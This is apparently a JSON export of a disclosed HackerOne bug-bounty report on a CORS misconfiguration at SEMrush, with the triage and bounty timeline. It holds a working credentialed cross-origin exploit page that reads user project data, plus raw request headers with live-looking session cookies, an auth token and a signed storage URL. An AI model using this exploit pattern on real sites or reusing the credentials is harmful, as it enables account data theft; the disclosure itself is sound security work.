{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-11-17T01:33:17.140Z", 
    "voters": [
        "jokebookservice1", 
        "sp1d3rs", 
        "europa", 
        "jensec", 
        "kapytein", 
        "surfrdan", 
        "riramar", 
        "bogdantcaciuc", 
        "flashdisk", 
        "muon4", 
        "and 51 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 235200, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "vulnerability_information": "Man, treat you another drink.\n\n\n## Description\n\nAn HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.\nTrusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.\nIf the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.\n\n##POC1\n**Request**\n```\nGET /organic-traffic-insights/api/rest/1.2/users/\u2588\u2588\u2588/projects?_=1496248656402 HTTP/1.1\nHost: www.semrush.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nReferer: https://www.semrush.com/projects/\nX-Requested-With: XMLHttpRequest\nCookie: wp13557=\"UWYYADs-TTTW:WWLHWYDtlnDl-TJIH-UYUTDDDIALHUZDLZTAHTIV-CCAY-XMLT-IUUA-UYUBWXWZACCWDlLtkNlo_Jht\"; ref_code=__default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%2C%22db%22%3A%22sg%22%7D; db_date=current; userdata=%7B%22tz%22%3A%22GMT+8%22%2C%22ol%22%3A%22en%22%7D; _ga=GA1.2.412244322.1496213122; _gid=GA1.2.1937633003.1496213122; visit_first=1496213122000; __uvt=; uvts=65OAcWY4QhJHESTs; referer_purchase=https%3A%2F%2Fes.semrush.com%2Fdashboard%2F; sct:feedback:show=false; __insp_uid=2126149429; temp_db_but=sg; db=us; exp_feature_popup_closed=yes; about_sessionid=gue5yj2t8bmucnlwuv1y1cxilq7a7q8g; about_csrf=i6C8isOR7WLuVa1348FSsPH6rXzVEQSr; n_userid=LuWhoFku7Ou4q2PeBHIUAg==; __zlcmid=gngUE7HFajaRsy; _bizo_bzid=ec0d2554-575b-420b-b404-51b70939ec49; _bizo_cksm=34222E182676EC07; _bizo_np_stats=155%3D338%2C; auth_token=CMFMT27JhWR9cnbkoV1dHvFaxc4tQ3f0B4IAw5BfTOjyeKeF9FKx8w2kpiLl; __insp_wid=1632961932; __insp_slim=1496248714271; __insp_nv=false; __insp_targlpu=aHR0cHM6Ly93d3cuc2VtcnVzaC5jb20vcHJvamVjdHMvIzgwMDEyMi92aWV3Lw%3D%3D; __insp_targlpt=U0VNcnVzaA%3D%3D; __insp_norec_howoften=true; __insp_norec_sess=true; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=en; connect.sid=s%253A4cV9yXJcfQFXmC65JJn3KSP6Wp184s10.vGOEA1%252BgVTXbwDY4YSOkOjjnteLNyifmcQdJh8XZckI; _gat=1; _uetsid=_uetd1ba382c; JSESSIONID=4423D9EF5D5BEE794094AC0713E9EE8E; _gat_UA-6197637-22=1\nConnection: close\nOrigin: https://itqayzlbkshw.com\n```\n\n**Response**\n```\nHTTP/1.1 200 \nServer: nginx\nDate: Thu, 01 Jun 2017 01:36:26 GMT\nContent-Type: application/json;charset=UTF-8\nContent-Length: 884\nConnection: close\nAccess-Control-Allow-Origin: https://itqayzlbkshw.com\nVary: Origin\nAccess-Control-Allow-Credentials: true\nX-XSS-Protection: 1; mode=block\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000; includeSubdomains; preload\nX-Frame-Options: SAMEORIGIN\n\n[{\"key\":\"\u2588\u2588\u2588\",\"projectId\":\"800122\",\"projectName\":\"dfsfsda\",\"status\":\"NOT_AUTHORISED\",\"authoriseUrl\":\"https://accounts.google.com/o/oauth2/auth?access_type=offline&approval_prompt=force&client_id=1093302022032-p190dsgnrdoavgstsem5i2pom6t9il6r.apps.googleusercontent.com&redirect_uri=http://gat.semrush.com/api/rest/1.2/auth&response_type=code&scope=https://www.googleapis.com/auth/analytics.readonly%20https://www.googleapis.com/auth/webmasters.readonly&state=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588_800122_%5B%22https://www.googleapis.com/auth/analytics.readonly%22,%22https://www.googleapis.com/auth/webmasters.readonly%22%5D\",\"email\":null,\"accounts\":null,\"account\":null,\"property\":null,\"view\":null,\"url\":null,\"siteUrls\":null,\"siteUrl\":null,\"database\":\"us\",\"device\":\"desktop\",\"totals\":null,\"created\":null,\"accountName\":null,\"propertyName\":null,\"viewName\":null}]\n```\n\nTake note from request I inject a header Origin: https://itqayzlbkshw.com then from response it returns Access-Control-Allow-Origin: https://itqayzlbkshw.com. Which mean there is CORS misconfig here.\n\n##POC 2\n1. open https://example.com in browser then inspect the page and go to console.\n2. run the following code in console and you would find it pops up user information\n```\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/\u2588\u2588\u2588\u2588/projects?_=1496248656402',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };\n```\n\n\n##Exploit\n```\n<html>\n<script>\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/\u2588\u2588\u2588/projects?_=1496248656402',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };\n</script>\n</html>\n```\n\nOpen above code in any browser and you would find it pops up user information like the attachment.\n\n##Comment\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server\n\n## How to fix \nRather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.\n\n\n\n ", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "high", 
            "privileges_required": "low", 
            "user_interaction": "required", 
            "attack_vector": "network", 
            "attack_complexity": "low", 
            "scope": "unchanged", 
            "integrity": "none", 
            "availability": "none"
        }, 
        "rating": "medium", 
        "score": 5.7, 
        "author_type": "Team"
    }, 
    "title": "Cross-origin resource sharing misconfig | steal user information ", 
    "is_member_of_team?": null, 
    "vote_count": 61, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-12-17T01:33:17.253Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,000", 
    "attachments": [
        {
            "file_name": "cors.PNG", 
            "type": "image/png", 
            "id": 190113, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/190/113/745ef5ea261711f865a4b670e68637d17d509ff7/cors.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222842Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d37e889b1e142b7fa549db7a755559eb8380ff4cbc52b3b3e7ca358057d3056b"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-06-01T02:33:10.302Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-01T02:33:10.302Z", 
            "actor": {
                "username": "bughunterboy", 
                "url": "/bughunterboy", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/078/089/67bf331aaabeb4303ca8fe13f44a78e7e3662b89_medium.png?1487608977"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "But it seems like you got a user token in the URL, so I do not think it can cause much damage. But it still needs to be fixed for this misconfig problem.", 
            "markdown_message": "<p>But it seems like you got a user token in the URL, so I do not think it can cause much damage. But it still needs to be fixed for this misconfig problem.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1719111, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-01T13:13:04.006Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-01T13:13:04.006Z", 
            "actor": {
                "username": "alla", 
                "url": "/alla", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "Thanks for the report, we will investigate this.", 
            "markdown_message": "<p>Thanks for the report, we will investigate this.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1721076, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-06T11:54:07.077Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-06T11:54:07.077Z", 
            "actor": {
                "username": "alla", 
                "url": "/alla", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 1734452, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-13T11:27:34.425Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-13T11:27:34.425Z", 
            "actor": {
                "username": "bughunterboy", 
                "url": "/bughunterboy", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/078/089/67bf331aaabeb4303ca8fe13f44a78e7e3662b89_medium.png?1487608977"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "Any update :)", 
            "markdown_message": "<p>Any update :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 1752375, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-13T12:56:47.203Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-13T12:56:47.203Z", 
            "actor": {
                "username": "alla", 
                "url": "/alla", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "Working on it.", 
            "markdown_message": "<p>Working on it.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1752540, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-13T12:57:19.885Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-13T12:57:19.885Z", 
            "actor": {
                "username": "bughunterboy", 
                "url": "/bughunterboy", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/078/089/67bf331aaabeb4303ca8fe13f44a78e7e3662b89_medium.png?1487608977"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "Ok. Thanks for update man", 
            "markdown_message": "<p>Ok. Thanks for update man</p>\n", 
            "type": "Activities::Comment", 
            "id": 1752541, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-15T03:33:56.889Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-15T03:33:56.889Z", 
            "actor": {
                "username": "bughunterboy", 
                "url": "/bughunterboy", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/078/089/67bf331aaabeb4303ca8fe13f44a78e7e3662b89_medium.png?1487608977"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "This one should be eligible for a bounty, right? LOL", 
            "markdown_message": "<p>This one should be eligible for a bounty, right? LOL</p>\n", 
            "type": "Activities::Comment", 
            "id": 1756948, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-15T10:08:13.703Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-15T10:08:13.703Z", 
            "actor": {
                "username": "alla", 
                "url": "/alla", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "Yes", 
            "markdown_message": "<p>Yes</p>\n", 
            "type": "Activities::Comment", 
            "id": 1757465, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-16T11:22:45.886Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-16T11:22:45.886Z", 
            "actor": {
                "username": "bughunterboy", 
                "url": "/bughunterboy", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/078/089/67bf331aaabeb4303ca8fe13f44a78e7e3662b89_medium.png?1487608977"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "Can u give me an account today do I can help u to test this weekend. My email.  shenytest@gmail.com   Thanks\n", 
            "markdown_message": "<p>Can u give me an account today do I can help u to test this weekend. My email.  <a title=\"shenytest@gmail.com\" href=\"mailto:shenytest@gmail.com\" rel=\"nofollow noopener noreferrer\">shenytest@gmail.com</a>   Thanks</p>\n", 
            "type": "Activities::Comment", 
            "id": 1760703, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-16T11:30:07.632Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-16T11:30:07.632Z", 
            "actor": {
                "username": "alla", 
                "url": "/alla", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "I've already added product to this account. It has GURU access.", 
            "markdown_message": "<p>I&#39;ve already added product to this account. It has GURU access.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1760733, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-16T11:32:22.523Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-16T11:32:22.523Z", 
            "actor": {
                "username": "bughunterboy", 
                "url": "/bughunterboy", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/078/089/67bf331aaabeb4303ca8fe13f44a78e7e3662b89_medium.png?1487608977"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "Oh. Thank you man!", 
            "markdown_message": "<p>Oh. Thank you man!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1760740, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-26T11:29:47.163Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-26T11:29:47.163Z", 
            "actor": {
                "username": "alla", 
                "url": "/alla", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Medium (5.7)", 
                "old_severity": "High (8.0)"
            }, 
            "team_handle": "semrush", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 1780485, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-06-26T11:31:06.610Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-26T11:31:06.610Z", 
            "actor": {
                "url": "/semrush", 
                "profile": {
                    "name": "SEMrush"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/966/9b01ecc388e5d9d64b3b532dd5db41b02323e9dc_medium.png?1477497046"
                }
            }, 
            "team_handle": "semrush", 
            "bonus_amount": "0.0", 
            "bounty_amount": "150.0", 
            "collaborator": {
                "username": "bughunterboy", 
                "url": "/bughunterboy"
            }, 
            "message": "Thanks for making our service safer!", 
            "markdown_message": "<p>Thanks for making our service safer!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1780486, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-07-21T07:13:29.454Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-21T07:13:29.454Z", 
            "actor": {
                "username": "bughunterboy", 
                "url": "/bughunterboy", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/078/089/67bf331aaabeb4303ca8fe13f44a78e7e3662b89_medium.png?1487608977"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "Still not fixed. lol", 
            "markdown_message": "<p>Still not fixed. lol</p>\n", 
            "type": "Activities::Comment", 
            "id": 1855801, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-07-23T19:31:37.899Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-23T19:31:37.899Z", 
            "actor": {
                "username": "alla", 
                "url": "/alla", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "Yeah, unfortunately so, I'll inform you when it will be fixed.", 
            "markdown_message": "<p>Yeah, unfortunately so, I&#39;ll inform you when it will be fixed.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1861088, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-14T18:54:06.224Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-14T18:54:06.224Z", 
            "actor": {
                "username": "prateek_0490", 
                "url": "/prateek_0490", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/038/091/e83379cfc01563cdbd5a978d19b66f7792e3a042_medium.png?1526319032"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "duplicate_report_id": 255696
            }, 
            "team_handle": "semrush", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ExternalUserJoined", 
            "id": 1927714, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-09-27T14:06:45.783Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-27T14:06:45.783Z", 
            "actor": {
                "url": "/semrush", 
                "profile": {
                    "name": "SEMrush"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/966/9b01ecc388e5d9d64b3b532dd5db41b02323e9dc_medium.png?1477497046"
                }
            }, 
            "team_handle": "semrush", 
            "bonus_amount": "0.0", 
            "bounty_amount": "850.0", 
            "collaborator": {
                "username": "bughunterboy", 
                "url": "/bughunterboy"
            }, 
            "message": "We've revised severity for this report and decided to add bonus.", 
            "markdown_message": "<p>We&#39;ve revised severity for this report and decided to add bonus.</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 2027414, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-27T14:20:14.108Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-27T14:20:14.108Z", 
            "actor": {
                "username": "bughunterboy", 
                "url": "/bughunterboy", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/078/089/67bf331aaabeb4303ca8fe13f44a78e7e3662b89_medium.png?1487608977"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "Wow. Really appreciate for that!\n\nAll the best wishes.", 
            "markdown_message": "<p>Wow. Really appreciate for that!</p>\n\n<p>All the best wishes.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2027448, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-10-09T16:41:23.640Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-10-09T16:41:23.640Z", 
            "actor": {
                "username": "alla", 
                "url": "/alla", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "Could you please check the fix?", 
            "markdown_message": "<p>Could you please check the fix?</p>\n", 
            "type": "Activities::Comment", 
            "id": 2053782, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-10-09T17:11:11.704Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-19T10:32:52.720Z", 
            "actor": {
                "username": "bughunterboy", 
                "url": "/bughunterboy", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/078/089/67bf331aaabeb4303ca8fe13f44a78e7e3662b89_medium.png?1487608977"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "Yes. It is fixed now. We can close it now.\n\n```\nFailed to load https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/projects?_=1496248656402: The 'Access-Control-Allow-Origin' header has a value 'https://www.semrush.com' that is not equal to the supplied origin. Origin 'https://example.com' is therefore not allowed access.\n```", 
            "markdown_message": "<p>Yes. It is fixed now. We can close it now.</p>\n<pre class=\"highlight plaintext\"><code>Failed to load https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/projects?_=1496248656402: The &#39;Access-Control-Allow-Origin&#39; header has a value &#39;https://www.semrush.com&#39; that is not equal to the supplied origin. Origin &#39;https://example.com&#39; is therefore not allowed access.\n</code></pre>", 
            "type": "Activities::Comment", 
            "id": 2053845, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "bughunterboy", 
                "url": "/bughunterboy"
            }, 
            "created_at": "2017-10-11T10:25:38.365Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-10-11T10:25:38.365Z", 
            "actor": {
                "username": "alla", 
                "url": "/alla", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 2058546, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-17T01:33:17.182Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-17T01:33:17.182Z", 
            "actor": {
                "username": "bughunterboy", 
                "url": "/bughunterboy", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/078/089/67bf331aaabeb4303ca8fe13f44a78e7e3662b89_medium.png?1487608977"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "first_to_agree": true, 
            "message": "mind public disclosure as you are public program now?", 
            "markdown_message": "<p>mind public disclosure as you are public program now?</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2164218, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-10T16:15:31.740Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-10T16:15:44.957Z", 
            "actor": {
                "username": "alla", 
                "url": "/alla", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "We've had open BB for not so long time ago, so we had no time to think about what exactly information we can afford to disclose. You can request disclosure using H1 functionality and we'll try to make decision and inform you in couple of weeks.\n\n", 
            "markdown_message": "<p>We&#39;ve had open BB for not so long time ago, so we had no time to think about what exactly information we can afford to disclose. You can request disclosure using H1 functionality and we&#39;ll try to make decision and inform you in couple of weeks.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2212345, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-10T16:33:45.081Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-10T16:33:45.081Z", 
            "actor": {
                "username": "bughunterboy", 
                "url": "/bughunterboy", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/078/089/67bf331aaabeb4303ca8fe13f44a78e7e3662b89_medium.png?1487608977"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "semrush", 
            "message": "hi,\nI think I alrwady requested it and all u need to do is agree", 
            "markdown_message": "<p>hi,<br>\nI think I alrwady requested it and all u need to do is agree</p>\n", 
            "type": "Activities::Comment", 
            "id": 2212376, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-17T01:33:19.731Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-17T01:33:19.731Z", 
            "actor": {
                "url": "/semrush", 
                "profile": {
                    "name": "SEMrush"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/966/9b01ecc388e5d9d64b3b532dd5db41b02323e9dc_medium.png?1477497046"
                }
            }, 
            "team_handle": "semrush", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2229712, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "bughunterboy", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/bughunterboy", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/078/089/bf13b8fb2e9a0d99a5539fb8e83c759c08cde6a1_small.png?1487608977"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -30660925.435193796, 
    "disclosed_at": "2017-12-17T01:33:19.703Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/235200", 
    "created_at": "2017-06-01T01:44:03.428Z", 
    "original_report_url": null, 
